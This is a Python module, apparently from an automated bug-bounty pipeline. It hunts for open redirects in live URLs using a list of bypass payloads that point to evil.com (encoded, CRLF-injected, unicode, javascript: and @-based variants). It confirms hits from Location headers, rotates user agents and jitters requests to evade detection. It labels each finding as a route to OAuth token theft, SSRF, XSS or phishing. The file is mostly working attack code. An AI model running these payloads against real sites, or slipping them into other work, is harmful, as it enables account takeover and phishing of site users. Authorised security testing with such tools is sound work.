#!/usr/bin/env python3
# modules/step30_open_redirect_chain.py — Open Redirect Chaining Engine
# Source: Bug Bounty Bootcamp Ch11 — Open Redirect to OAuth token theft, SSRF
# Chains redirect bugs into higher-impact findings
# MilkyWay Intelligence | Author: Sharlix + M7AI

import re, urllib.parse, urllib.request, urllib.error
from core.utils import safe_read

REDIRECT_PARAMS = {
    "redirect","redirect_url","redirect_uri","url","next","return","return_to",
    "go","goto","continue","r","rurl","target","destination","dest","forward",
    "location","link","ref","referer","callback","back","from","to","out",
    "checkout_url","login","logout","returnurl","returnTo","returnURL",
}

REDIRECT_PAYLOADS = [
    # Basic
    "//evil.com",
    "https://evil.com",
    "//evil.com/%2F..",
    # Protocol bypass
    "javascript://evil.com/%0aalert(1)",
    "https:\\/\\/evil.com",
    # Encoded
    "%2F%2Fevil.com",
    "https%3A%2F%2Fevil.com",
    "%68%74%74%70%73%3a%2f%2fevil.com",       # hex: https://evil.com
    # CRLF
    "//evil.com%0d%0aLocation:evil.com",
    # Double URL encode
    "%252F%252Fevil.com",
    # Unicode
    "//evil\u3002com",
    "//evil．com",
    # @-based
    "//evil.com@legitimate.com",
    "/\\/evil.com",
    "/%09/evil.com",                           # tab
    "////evil.com",
]

# Impact chains from Bug Bounty Bootcamp Ch11
CHAIN_TARGETS = {
    "oauth_state":    "OAuth state bypass → token theft",
    "ssrf":           "Redirect to internal → SSRF amplification",
    "xss":            "javascript: protocol → XSS",
    "phishing":       "Redirect to attacker page → credential phishing",
}


class Step30OpenRedirectChain:
    """
    Open Redirect Chainer.
    Bug Bounty Bootcamp Ch11 methodology:
    1. Find redirect parameters
    2. Test all bypass payloads
    3. Identify chain opportunities (OAuth, SSRF, XSS)
    4. Report with chain impact
    """

    def __init__(self, pipeline):
        self.p   = pipeline
        self.log = pipeline.log

    def run(self):
        p     = self.p
        out   = p.files["redirect_results"]
        urls  = safe_read(p.files.get("urls",""))
        found = 0

        redirect_urls = [u for u in urls if "?" in u][:500]
        if not redirect_urls:
            self.log.warn("Open Redirect: no parameterized URLs"); return

        # Filter to redirect-prone URLs
        targets = self._filter_redirect_urls(redirect_urls)
        self.log.info(f"Open Redirect V7: {len(targets)} redirect candidates — chaining analysis")

        tested = set()
        for url in targets:
            norm = self._normalize(url)
            if norm in tested: continue
            tested.add(norm)

            result = self._test_url(url)
            if result:
                sev, vuln_type, detail, payload = result
                chain = self._identify_chain(url, payload)
                full_detail = f"{detail} | Chain: {chain}"
                with open(out,"a") as f:
                    f.write(f"REDIRECT: {url} | {full_detail}\n")
                p.add_finding(sev, vuln_type, url, full_detail,
                              "redirect-chain-engine", payload=payload)
                found += 1

            p.bypass.jitter()

        self.log.success(f"Open Redirect V7: {found} confirmed redirects")

    def _filter_redirect_urls(self, urls: list) -> list:
        """Keep only URLs with redirect-prone parameters."""
        out = []
        for url in urls:
            try:
                qs = urllib.parse.parse_qs(urllib.parse.urlparse(url).query)
                if any(k.lower() in REDIRECT_PARAMS for k in qs):
                    out.append(url)
            except Exception:
                pass
        return out[:150]

    def _test_url(self, url: str):
        """Test all redirect payloads, return first confirmed bypass."""
        try:
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        except Exception:
            return None

        # Find redirect params
        redirect_params = [k for k in qs if k.lower() in REDIRECT_PARAMS]
        if not redirect_params:
            return None

        for param in redirect_params[:2]:
            for payload in REDIRECT_PAYLOADS:
                test_qs = {k: list(v) for k,v in qs.items()}
                test_qs[param] = [payload]
                test_url = urllib.parse.urlunparse(
                    parsed._replace(
                        query=urllib.parse.urlencode(test_qs, doseq=True)
                    )
                )
                result = self._check_redirect(test_url, payload)
                if result:
                    sev, detail = result
                    return (sev, "OPEN_REDIRECT", detail, payload)
        return None

    def _check_redirect(self, url: str, payload: str):
        """
        Check if redirect occurs to attacker-controlled location.
        Bug Bounty Bootcamp: confirmed = 3xx to evil.com or javascript:
        """
        try:
            req = urllib.request.Request(url, headers={
                "User-Agent": self.p.bypass.ua(),
            })
            # Do NOT follow redirects — capture Location header
            opener = urllib.request.build_opener(
                urllib.request.HTTPRedirectHandler()
            )
            resp = opener.open(req, timeout=8)
            status   = resp.status
            location = resp.headers.get("location","")
        except urllib.error.HTTPError as e:
            status   = e.code
            location = e.headers.get("location","")
        except Exception:
            return None

        if status in (301,302,303,307,308) and location:
            # Confirmed redirect to evil
            if "evil.com" in location:
                sev = "high" if "javascript:" not in payload else "critical"
                return (sev,
                    f"Open Redirect confirmed: param redirects to '{location[:60]}'")
            # javascript: protocol = XSS chain
            if "javascript:" in location.lower():
                return ("critical",
                    f"Open Redirect + XSS: javascript: in Location '{location[:60]}'")
        return None

    def _identify_chain(self, url: str, payload: str) -> str:
        """
        Bug Bounty Bootcamp Ch11: identify highest-impact chain.
        """
        url_lower = url.lower()

        if any(k in url_lower for k in ["oauth","auth","login","sso","connect"]):
            return "OAuth token theft — use redirect in OAuth flow to steal auth code"

        if any(k in url_lower for k in ["api","internal","admin","localhost"]):
            return "SSRF chain — internal redirect may reach internal services"

        if "javascript:" in payload:
            return "XSS chain — javascript: protocol executes script in victim browser"

        return "Phishing — redirect victim to attacker-controlled phishing page"

    def _normalize(self, url: str) -> str:
        """Normalize URL for deduplication."""
        try:
            p = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(p.query)
            keys = tuple(sorted(qs.keys()))
            return f"{p.netloc}{p.path}?{keys}"
        except Exception:
            return url
